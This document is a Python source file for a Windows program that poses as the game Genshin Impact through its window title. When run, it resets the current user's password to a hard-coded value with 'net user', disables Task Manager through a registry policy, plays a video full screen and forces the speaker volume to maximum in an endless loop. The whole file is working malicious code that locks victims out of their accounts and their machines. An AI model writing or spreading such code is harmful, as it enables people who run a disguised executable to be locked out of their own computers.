import sys
import os
import threading

from PySide6.QtCore import QUrl
from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
from PySide6.QtMultimediaWidgets import QVideoWidget
from PySide6.QtWidgets import QMainWindow, QApplication

from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume


def set_audio(volume):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL, None)
    volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
    # 设置音量（0.0到1.0之间的浮点数）
    volume_interface.SetMasterVolumeLevelScalar(volume, None)


class MainWindow(QMainWindow):
    def __init__(self, pt):
        super().__init__()
        self._audio_output = QAudioOutput()
        # 创建媒体播放器对象
        self._player = QMediaPlayer()
        self._player.setAudioOutput(self._audio_output)
        # 创建视频显示部件
        self._video_widget = QVideoWidget()
        # 设置视频显示部件为主窗口的中心部件
        self.setCentralWidget(self._video_widget)
        # 将视频显示部件设置为媒体播放器的视频输出设备
        self._player.setVideoOutput(self._video_widget)
        self.pt = pt

    def play(self):
        self._player.setSource(QUrl.fromLocalFile(self.pt))
        self._player.play()


def ts():

    while True:
        set_audio(1.0)


def disable_task_manage(num):
    os.system('reg add "HKEY_CURRENT_USER\Software\Microsoft'
              '\Windows\CurrentVersion\Policies\System" /v DisableTask'
              f'Mgr /t REG_DWORD /d {num} /f')


def passwd():
    os.system('echo %username% > a')

    file = open('./a', 'r', encoding='utf-8')
    userName = file.readlines()
    print(userName, type(userName))
    userName = userName[0].split()[0]

    print(userName)

    os.system(f'net user {userName} 1145141919810')


if __name__ == '__main__':
    app = QApplication(sys.argv)
    # 获取打包后的可执行文件所在的临时目录
    base_path = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))

    # 构建视频文件的绝对路径
    video_path = os.path.join(base_path, 'video.mp4')

    main_win = MainWindow(video_path)
    available_geometry = main_win.screen().availableGeometry()
    main_win.resize(available_geometry.width() / 3,
                    available_geometry.height() / 2)
    main_win.setWindowTitle('原神')
    passwd()
    main_win.showFullScreen()
    main_win.play()

    disable_task_manage(1)
    set_audio(1.0)

    threading.Thread(target=app.exec()).start()
    threading.Thread(target=ts()).start()

    sys.exit(app.exec())
